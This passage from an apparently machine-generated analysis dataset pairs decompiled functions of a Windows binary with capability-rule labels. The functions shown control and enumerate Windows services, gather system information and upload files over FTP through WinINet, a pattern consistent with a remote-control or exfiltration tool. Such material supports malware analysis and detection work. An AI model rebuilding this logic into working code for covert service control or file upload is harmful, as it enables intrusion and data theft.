*var_38h;\n    uint32_t var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    iVar3 = 0xd;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_18h = 0x466f67;\n    var_14h = unaff_EDI;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    var_1ch = 0x4674db;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00466f48::var_20h;\n    if (var_4h != 0) {\n        var_24h = *0x4674ec;\n        var_28h = &fcn.00466f48::var_2ch;\n        var_2ch = 0x466f9d;\n        var_18h = &stack0xfffffffc;\n        fcn.0040ef34(var_28h, var_24h);\n        var_2ch = 0x466fa8;\n        fcn.004055c8();\n        var_2ch = *0x4674ec;\n        var_30h = &fcn.00466f48::var_30h;\n        var_34h = 0x466fc6;\n        fcn.0040ef34(var_30h, var_2ch);\n        var_34h = 0x466fd1;\n        fcn.004055c8();\n        var_34h = 0x466fdd;\n        piVar2 = fcn.00404620();\n        var_34h = 0x466fe9;\n        (**(*piVar2 + 0x90))();\n        var_34h = 0x466ff3;\n        (**(*piVar2 + 0x2c))();\n        var_34h = 0x466ffc;\n        (**(*piVar2 + 0x48))();\n        var_34h = 0x467005;\n        (**(*piVar2 + 0x48))();\n        var_34h = 0x46700e;\n        (**(*piVar2 + 0x48))();\n        var_34h = 0x467017;\n        (**(*piVar2 + 0x48))();\n        do {\n            var_24h = 0x467023;\n            (**(*piVar2 + 0xc))();\n            var_24h = 0x46702e;\n            fcn.00409b6c();\n            var_24h = 0x467039;\n            fcn.004055c8();\n            var_24h = &fcn.00466f48::var_8h;\n            var_28h = 0x46704a;\n            fcn.00405b28();\n            var_28h = 0x46705a;\n            fcn.00405a44();\n            var_28h = 0x467067;\n            fcn.00405b28();\n            var_28h = 0x467076;\n            fcn.00405a84();\n            var_28h = 0x467081;\n            fcn.00409b6c();\n            var_28h = 0x46708c;\n            fcn.004055c8();\n            var_28h = &fcn.00466f48::var_ch;\n            var_2ch = 0x46709d;\n            fcn.00405b28();\n            var_2ch = 0x4670ad;\n            fcn.00405a44();\n            var_2ch = 0x4670ba;\n            fcn.00405b28();\n            var_2ch = 0x4670c9;\n            fcn.00405a84();\n            var_2ch = 0x4670d4;\n            fcn.00409b6c();\n            var_2ch = 0x4670df;\n            fcn.004055c8();\n            var_2ch = &fcn.00466f48::var_10h;\n            var_30h = 0x4670f0;\n            fcn.00405b28();\n            var_30h = 0x467100;\n            fcn.00405a44();\n            var_30h = 0x46710d;\n            fcn.00405b28();\n            var_30h = 0x46711c;\n            fcn.00405a84();\n            var_30h = 0x467127;\n            fcn.00409b6c();\n            var_30h = 0x467132;\n            fcn.004055c8();\n            var_30h = &fcn.00466f48::var_14h;\n            var_34h = 0x467143;\n            fcn.00405b28();\n            var_34h = 0x467153;\n            fcn.00405a44();\n            var_34h = 0x467160;\n            fcn.00405b28();\n            var_34h = 0x46716f;\n            fcn.00405a84();\n            var_34h = 0x46717a;\n            fcn.00409b6c();\n            var_34h = 0x467182;\n            fcn.00409ecc();\n            var_34h = 0x46718a;\n            fcn.00466c38();\n            var_34h = 0x467197;\n            cVar1 = fcn.00466eac();\n            if (cVar1 == '\\x01') {\n                var_34h = *0x467540;\n                var_38h = &fcn.00466f48::var_44h;\n                var_3ch = 0x4671b9;\n                fcn.0040ef34(var_38h, var_34h);\n                var_3ch = 0x4671c4;\n                fcn.004055c8();\n                var_3ch = *0x467540;\n                var_40h = &fcn.00466f48::var_48h;\n                var_44h = 0x4671e2;\n                fcn.0040ef34(var_40h, var_3ch);\n                var_44h = 0x4671ed;\n                fcn.004055c8();\n                var_44h = *0x467540;\n                var_48h = &fcn.00466f48::var_4ch;\n                var_4ch = 0x46720b;\n                fcn.0040ef34(var_48h, var_44h);\n                var_4ch = 0x467216;\n                fcn.004055c8();\n            }\n            var_4ch = &fcn.00466f48::var_18h;\n            var_50h = 0x467227;\n            fcn.00405b28();\n            var_50h = 0x467237;\n            fcn.00405a44();\n            var_50h = 0x467244;\n            fcn.00405b28();\n            var_50h = 0x467253;\n            fcn.00405a84();\n            var_50h = 0x46725c;\n            (**(*piVar2 + 0x48))();\n            var_50h = 0x467267;\n            fcn.00409b6c();\n            if (var_50h == NULL) {\n                var_50h = 0x46727e;\n                cVar1 = fcn.00466eac();\n                if (cVar1 == '\\x01') {\n                    var_50h = *0x467540;\n                    var_54h = &fcn.00466f48::var_54h;\n                    var_58h = 0x4672a0;\n                    fcn.0040ef34(var_54h, var_50h);\n                    var_58h = 0x4672ab;\n                    fcn.004055c8();\n                    var_58h = *0x467540;\n                    var_5ch = &fcn.00466f48::var_58h;\n                    var_60h = 0x4672c9;\n                    fcn.0040ef34(var_5ch, var_58h);\n                    var_60h = 0x4672d4;\n                    fcn.004055c8();\n                    var_60h = *0x467540;\n                    var_64h = &fcn.00466f48::var_5ch;\n                    var_68h = 0x4672f2;\n                    fcn.0040ef34(var_64h, var_60h);\n                    var_68h = 0x4672fd;\n                    fcn.004055c8();\n                }\n                var_50h = 0x46730a;\n                fcn.004055c8();\n                var_50h = &fcn.00466f48::var_1ch;\n                var_54h = 0x46731b;\n                fcn.00405b28();\n                var_54h = 0x46732b;\n                fcn.00405a44();\n                var_54h = 0x467338;\n                fcn.00405b28();\n                var_54h = 0x467347;\n                fcn.00405a84();\n                var_54h = *param_2;\n                var_58h = var_24h;\n                var_5ch = 0x467570;\n                var_60h = var_8h;\n                var_64h = 0x467570;\n                var_68h = var_18h;\n                fcn.004058e0(0x46757c, var_20h, 0x467570, var_10h, 0x467570, var_14h, 0x467570, var_1ch, 0x467570, \n                             var_ch, 0x467570);\n            }\n            else {\n                var_50h = 0x4673a7;\n                cVar1 = fcn.00466eac();\n                if (cVar1 == '\\x01') {\n                    var_50h = *0x467540;\n                    var_54h = &fcn.00466f48::var_60h;\n                    var_58h = 0x4673c9;\n                    fcn.0040ef34(var_54h, var_50h);\n                    var_58h = 0x4673d4;\n                    fcn.004055c8();\n                    var_58h = *0x467540;\n                    var_5ch = &fcn.00466f48::var_64h;\n                    var_60h = 0x4673f2;\n                    fcn.0040ef34(var_5ch, var_58h);\n                    var_60h = 0x4673fd;\n                    fcn.004055c8();\n                    var_60h = *0x467540;\n                    var_64h = &fcn.00466f48::var_68h;\n                    var_68h = 0x46741b;\n                    fcn.0040ef34(var_64h, var_60h);\n                    var_68h = 0x467426;\n                    fcn.004055c8();\n                }\n                var_50h = &fcn.00466f48::var_1ch;\n                var_54h = 0x467437;\n                fcn.00405b28();\n                var_54h = 0x467447;\n                fcn.00405a44();\n                var_54h = 0x467454;\n                fcn.00405b28();\n                var_54h = 0x467463;\n                fcn.00405a84();\n                var_54h = *param_2;\n                var_58h = var_24h;\n                var_5ch = 0x467570;\n                var_60h = var_8h;\n                var_64h = 0x467570;\n                var_68h = var_18h;\n                fcn.004058e0(0x46757c, var_20h, 0x467570, var_14h, 0x467570, var_10h, 0x467570, var_1ch, 0x467570, \n                             var_ch, 0x467570);\n            }\n            iVar3 = (**(*piVar2 + 0x14))();\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = var_20h;\n    var_18h = 0x4674e2;\n    var_1ch = 0x4674da;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 3431
    },
    "004680dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004680dc(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint lpServiceStatus;\n    int32_t hSCManager;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = 0x4680f1;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack52 = 0x4680f9;\n    fcn.004059cc();\n    uStack56 = 0x468197;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uStack64 = 0xf003f;\n    uStack68 = 0;\n    uStack72 = 0x468116;\n    puStack52 = &stack0xfffffffc;\n    uStack72 = fcn.004059dc();\n    puStack76 = 0x46811c;\n    hSCManager = sub.advapi32.dll_OpenSCManagerA();\n    if (hSCManager != 0) {\n        uStack80 = 0x468175;\n        uStack84 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffac;\n        puStack76 = &stack0xfffffffc;\n        uVar1 = fcn.004059dc(0xf01ff);\n        uVar1 = sub.advapi32.dll_OpenServiceA(hSCManager, uVar1);\n        sub.advapi32.dll_ControlService(uVar1, 1, &fcn.004680dc::lpServiceStatus);\n        sub.advapi32.dll_CloseServiceHandle();\n        *in_FS_OFFSET = uVar1;\n        sub.advapi32.dll_CloseServiceHandle(hSCManager, 0x46817c);\n        return;\n    }\n    *in_FS_OFFSET = uStack72;\n    uStack64 = 0x46819e;\n    uStack68 = 0x468196;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 494
    },
    "004681a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004681a4(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    int32_t hSCManager;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4681b9;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack28 = 0x4681c1;\n    fcn.004059cc();\n    uStack32 = 0x468264;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack40 = 0xf003f;\n    uStack44 = 0;\n    uStack48 = 0x4681de;\n    puStack28 = &stack0xfffffffc;\n    uStack48 = fcn.004059dc();\n    puStack52 = 0x4681e4;\n    hSCManager = sub.advapi32.dll_OpenSCManagerA();\n    if (hSCManager != 0) {\n        uStack56 = 0x468242;\n        uStack60 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc4;\n        puStack52 = &stack0xfffffffc;\n        uVar1 = fcn.004059dc(0xf01ff);\n        uVar1 = sub.advapi32.dll_OpenServiceA(hSCManager, uVar1);\n        var_10h = 0;\n        sub.advapi32.dll_StartServiceA(uVar1, 0, &fcn.004681a4::var_10h);\n        sub.advapi32.dll_CloseServiceHandle();\n        *in_FS_OFFSET = uVar1;\n        sub.advapi32.dll_CloseServiceHandle(hSCManager, 0x468249);\n        return;\n    }\n    *in_FS_OFFSET = uStack48;\n    uStack40 = 0x46826b;\n    uStack44 = 0x468263;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 509
    },
    "00468a1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00468a1c(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uint uStack444;\n    uchar *puStack440;\n    uint uStack436;\n    uint uStack432;\n    uint uStack428;\n    uchar *puStack424;\n    uint uStack420;\n    uint uStack416;\n    uint32_t uStack140;\n    int32_t iStack136;\n    uchar auStack116 [40];\n    uint8_t uStack76;\n    int32_t iStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint32_t uStack56;\n    \n    uVar2 = 0;\n    uStack416 = 0;\n    uStack420 = 0x2c;\n    puStack424 = &stack0xffffffbc;\n    uStack428 = 0;\n    uStack432 = 0x468a38;\n    iVar1 = sub.ntdll.dll_NtQuerySystemInformation();\n    if (iVar1 == 0) {\n        uStack432 = 0;\n        uStack436 = 0x20;\n        puStack440 = &stack0xffffff8c;\n        puVar4 = &stack0xfffffe44;\n        uStack444 = 3;\n        iVar1 = sub.ntdll.dll_NtQuerySystemInformation();\n        if (iVar1 == 0) {\n            uVar3 = 2;\n            iVar1 = sub.ntdll.dll_NtQuerySystemInformation(2, &stack0xfffffe44, 0x138, 0);\n            if (iVar1 == 0) {\n                if (*0x490b34 != NULL || *0x490b30 != 0) {\n                    iStack72 = uVar3 - *0x490b30;\n                    puStack68 = puVar4 + (-(uVar3 < *0x490b30) - *0x490b34);\n                    iStack64 = uStack140 - *0x490b38;\n                    iStack60 = (iStack136 - *0x490b3c) - (uStack140 < *0x490b38);\n                    uStack56 = uStack76;\n                    *0x490b40 = fcn.0040345c();\n                    if (*0x490b34 != NULL || *0x490b40 != *0x490b30) {\n                        uVar2 = *0x490b40;\n                    }\n                }\n                *0x490b34 = puVar4;\n                *0x490b30 = uVar3;\n                *0x490b38 = uStack140;\n                *0x490b3c = iStack136;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 616
    },
    "0046b000": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046b000(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffeb8;\n    uint uVar5;\n    int32_t iStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint var_114h;\n    uint lpszFile;\n    uint hDrop;\n    uint hMem;\n    \n    puStack296 = &stack0xfffffffc;\n    uStack300 = 0x46b0e0;\n    iStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack304;\n    fcn.00405530();\n    fcn.004319ec();\n    iVar1 = fcn.004318e0();\n    if (iVar1 != 0) {\n        uVar2 = sub.kernel32.dll_GlobalLock(iVar1);\n        uVar5 = uVar2;\n        iVar3 = sub.shell32.dll_DragQueryFileA(uVar2, 0xffffffff, 0, 0);\n        if (-1 < iVar3 + -1) {\n            do {\n                uVar5 = uVar2;\n                sub.shell32.dll_DragQueryFileA();\n                iVar4 = fcn.0040a858();\n                if (iVar4 != 0) {\n                    fcn.00405728(*in_EAX);\n                    uVar5 = 0x46b0f8;\n                    fcn.004058e0();\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        sub.kernel32.dll_GlobalUnlock(iVar1, uVar5);\n        in_stack_fffffeb8 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_fffffeb8;\n    fcn.00405530(0x46b0e7);\n    return;\n}\n",
        "token_count": 429
    },
    "0046baac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046baac(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    char **ppcVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    bool bVar5;\n    uint uStackY18476;\n    uint uStackY18472;\n    uchar *puStackY18468;\n    uint *puStackY18464;\n    uint *puStackY18460;\n    char *apcStackY18456 [3048];\n    uint uStackY6264;\n    uint uStackY6256;\n    uint uStackY6252;\n    uchar *puStackY6248;\n    uint uStackY6244;\n    uint *puStackY6240;\n    uint *puStackY6236;\n    uint *puStackY6232;\n    int32_t iStackY6228;\n    uint uStackY6224;\n    uchar *arg_8h;\n    int32_t iStack6216;\n    uint uStack6212;\n    uchar *puStack6208;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t hSCManager;\n    int32_t *var_4h;\n    \n    puStack6208 = &stack0xfffffffc;\n    piVar1 = 0x4;\n    do {\n        piVar2 = piVar1;\n        piVar1 = piVar2 + -1;\n    } while (piVar2 + -1 != NULL);\n    uStackY18476 = 0;\n    puStackY18468 = NULL;\n    uStackY18472 = 0;\n    puStackY18464 = NULL;\n    puStackY18460 = NULL;\n    uStack6212 = 0x46bc94;\n    iStack6216 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffe7b8;\n    var_4h = piVar2;\n    fcn.00405530();\n    uStackY6224 = 0;\n    iStackY6228 = 0;\n    puStackY6232 = 0x46bb13;\n    hSCManager = sub.advapi32.dll_OpenSCManagerA();\n    if (hSCManager != 0) {\n        var_14h = 0;\n        do {\n            puStackY6232 = &fcn.0046baac::var_14h;\n            puStackY6236 = &fcn.0046baac::var_10h;\n            puStackY6240 = &fcn.0046baac::var_ch;\n            uStackY6244 = 0x4800;\n            puStackY6248 = &stack0xffffb7e8;\n            uStackY6252 = 3;\n            uStackY6256 = 0x13f;\n            iStackY6228 = hSCManager;\n            uStackY6264 = 0x46bb4d;\n            sub.advapi32.dll_EnumServicesStatusA();\n            if (-1 < var_10h + -1) {\n                ppcVar3 = &stack0xffffb7e8;\n                iVar4 = var_10h;\n                do {\n                    bVar5 = *ppcVar3 == NULL;\n                    if (!bVar5) {\n                        bVar5 = **ppcVar3 == '\\0';\n                    }\n                    if (bVar5) {\n                        puStackY6232 = 0x46bb77;\n                        fcn.00405818();\n                    }\n                    else {\n                        puStackY6232 = *piVar2;\n                        puStackY6236 = 0x46bb88;\n                        fcn.00405728();\n                        puStackY6236 = puStackY18460;\n                        puStackY6240 = 0x46bcac;\n                        uStackY6244 = 0x46bb9f;\n                        fcn.004058e0();\n                    }\n                    bVar5 = ppcVar3[1] == NULL;\n                    if (!bVar5) {\n                        bVar5 = *ppcVar3[1] == '\\0';\n                    }\n                    if (bVar5) {\n                        puStackY6232 = 0x46bbb7;\n                        fcn.00405818();\n                    }\n                    else {\n                        puStackY6232 = *piVar2;\n                        puStackY6236 = 0x46bbc9;\n                        fcn.00405728();\n                        puStackY6236 = puStackY18464;\n                        puStackY6240 = 0x46bcac;\n                        uStackY6244 = 0x46bbe0;\n                        fcn.004058e0();\n                    }\n                    puStack6208 = 0x46bbef;\n                    fcn.00405728();\n                    puStack6208 = 0x46bc00;\n                    fcn.0046b710();\n                    puStack6208 = puStackY18468;\n                    uStack6212 = 0x46bcac;\n                    iStack6216 = 0x46bc17;\n                    fcn.004058e0();\n                    iStack6216 = *piVar2;\n                    arg_8h = &stack0xffffb7d4;\n                    uStackY6224 = 0x46bc2d;\n                    fcn.00405728();\n                    uStackY6224 = 0x46bc3c;\n                    fcn.0046b924(arg_8h);\n                    uStackY6224 = uStackY18476;\n                    iStackY6228 = 0x46bcb8;\n                    puStackY6232 = 0x46bc53;\n                    fcn.004058e0();\n                    ppcVar3 = ppcVar3 + 9;\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != 0);\n            }\n        } while (var_ch != 0);\n        if (hSCManager != 0) {\n            iStackY6228 = hSCManager;\n            puStackY6236 = 0x46bc76;\n            sub.advapi32.dll_CloseServiceHandle();\n        }\n    }\n    *in_FS_OFFSET = iStackY6228;\n    uStackY6224 = 0x46bc93;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1374
    },
    "0046ce48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046ce48(uint param_1, char param_2)\n\n{\n    char cVar1;\n    uint32_t arg_ch;\n    uint32_t uVar2;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack560;\n    uint32_t uStack556;\n    uchar *puStack552;\n    uint32_t uStack532;\n    uint uStack528;\n    uchar *puStack524;\n    uint32_t uStack520;\n    uint uStack516;\n    uchar *puStack512;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    char var_dh;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack524 = &stack0xfffffffc;\n    var_1e8h = 0;\n    var_1e4h = 0;\n    var_1e0h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    puStack512 = 0x46ce82;\n    var_dh = param_2;\n    fcn.004059cc();\n    uStack516 = 0x46d07e;\n    uStack520 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdf8;\n    uStack528 = 0x46d042;\n    uStack532 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdec;\n    puStack512 = &stack0xfffffffc;\n    fcn.00405530();\n    fcn.0046be34();\n    fcn.00405818();\n    fcn.00403770();\n    fcn.0040ef34(&fcn.0046ce48::var_1e4h, *0x46d0a8);\n    fcn.004055c8();\n    arg_ch = *0x46d0a8;\n    puStack552 = 0x46cf22;\n    fcn.0040ef34(&fcn.0046ce48::var_1e8h, arg_ch);\n    puStack552 = 0x46cf30;\n    fcn.004055c8();\n    uStack556 = 0x46cf79;\n    uStack560 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdd0;\n    puStack552 = &stack0xfffffffc;\n    fcn.0046be34(0x80);\n    fcn.00405818();\n    uVar2 = fcn.004059dc();\n    sub.kernel32.dll_SetFileAttributesA();\n    *in_FS_OFFSET = uVar2;\n    if (var_dh != '\\0') {\n        uStack560 = 0x46cf94;\n        fcn.004034f4();\n        uStack560 = 0x46cf99;\n        fcn.0040305c();\n        while( true ) {\n            uStack560 = 0x46cfdc;\n            fcn.00403abc();\n            uStack560 = 0x46cfe1;\n            cVar1 = fcn.0040305c();\n            if (cVar1 != '\\0') break;\n            uStack560 = 0x46cfa9;\n            fcn.00403cc4();\n            uStack560 = 0x46cfb4;\n            fcn.00403d30();\n            uStack560 = 0x46cfb9;\n            fcn.0040305c();\n            uStack560 = var_8h;\n            uStack556 = 0x46d0b4;\n            fcn.004058e0(uVar2, var_ch);\n        }\n        uStack560 = 0x46cff0;\n        fcn.00403918();\n        uStack560 = 0x46cff5;\n        fcn.0040305c();\n    }\n    uStack560 = 0x46d000;\n    fcn.00405818();\n    uStack560 = 0x46d00b;\n    fcn.00403500();\n    uStack560 = 0x46d010;\n    fcn.0040305c();\n    uStack560 = 0x46d01e;\n    fcn.00405cd0();\n    uStack560 = 0x46d023;\n    fcn.004040ac();\n    uStack560 = 0x46d028;\n    fcn.0040305c();\n    uStack560 = 0x46d033;\n    fcn.00403918();\n    uStack560 = 0x46d038;\n    fcn.0040305c();\n    *in_FS_OFFSET = uStack556;\n    *in_FS_OFFSET = arg_ch;\n    fcn.00405554();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1074
    },
    "0046d0dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046d0dc(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStackY528;\n    uint uStack520;\n    uint uStack516;\n    uchar *puStack512;\n    uint uStack508;\n    uint uStack504;\n    uchar *puStack500;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack500 = &stack0xfffffffc;\n    puStack512 = &stack0xfffffffc;\n    uStack504 = 0x46d253;\n    uStack508 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe04;\n    uStack516 = 0x46d217;\n    uStack520 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdf8;\n    fcn.00405530();\n    fcn.0046be34();\n    fcn.00405818();\n    fcn.00403770();\n    fcn.0046be34(0x80);\n    fcn.00405818();\n    uStackY528 = fcn.004059dc();\n    sub.kernel32.dll_SetFileAttributesA();\n    fcn.004034f4();\n    fcn.0040305c();\n    while( true ) {\n        fcn.00403abc();\n        cVar1 = fcn.0040305c();\n        if (cVar1 != '\\0') break;\n        fcn.00403cc4();\n        fcn.00403d30();\n        fcn.0040305c();\n        uStackY528 = 0x46d288;\n        fcn.004058e0();\n    }\n    fcn.00403918();\n    fcn.0040305c();\n    fcn.00409b6c();\n    fcn.004055c8();\n    fcn.00405584();\n    *in_FS_OFFSET = uStackY528;\n    *in_FS_OFFSET = uStack516;\n    uStack508 = 0x46d25a;\n    puStack512 = 0x46d245;\n    fcn.00405554();\n    puStack512 = 0x46d252;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 520
    },
    "0046d7c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046d7c4(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x46d7dc;\n    fcn.004059cc();\n    puStack24 = 0x46d7e4;\n    fcn.004059cc();\n    puStack24 = 0x46d7ec;\n    fcn.004059cc();\n    puStack24 = 0x46d7f4;\n    fcn.004059cc();\n    uStack28 = 0x46d89e;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    *0x49818c = sub.wininet.dll_InternetOpenA(0x46d8b0, 0, 0, 0, 0);\n    if (*0x49818c != 0) {\n        uVar1 = fcn.004059dc(1, 0, 0);\n        uVar1 = fcn.004059dc(uVar1);\n        uVar1 = fcn.00409ecc(uVar1);\n        uVar1 = fcn.004059dc(uVar1);\n        in_stack_ffffffac = *0x49818c;\n        *0x498188 = sub.wininet.dll_InternetConnectA(*0x49818c, uVar1);\n        if (*0x498188 != 0) {\n            *0x490b48 = 1;\n            goto code_r0x0046d87b;\n        }\n    }\n    *0x490b48 = 0;\ncode_r0x0046d87b:\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.00405554(0x46d8a5);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 474
    },
    "0046d8b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046d8b8(void)\n\n{\n    if (*0x490b48 != '\\0') {\n        sub.wininet.dll_InternetCloseHandle(*0x49818c);\n        sub.wininet.dll_InternetCloseHandle(*0x498188);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "0046d8d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046d8d8(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd0;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x46d8ed;\n    fcn.004059cc();\n    puStack20 = 0x46d8f5;\n    fcn.004059cc();\n    uStack24 = 0x46d950;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    if (*0x490b48 != '\\0') {\n        puStack20 = &stack0xfffffffc;\n        uVar1 = fcn.004059dc(2, 0);\n        uVar1 = fcn.004059dc(uVar1);\n        in_stack_ffffffd0 = *0x498188;\n        sub.wininet.dll_FtpPutFileA(*0x498188, uVar1);\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.00405554(0x46d957);\n    return;\n}\n",
        "token_count": 282
    },
    "0046e134": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
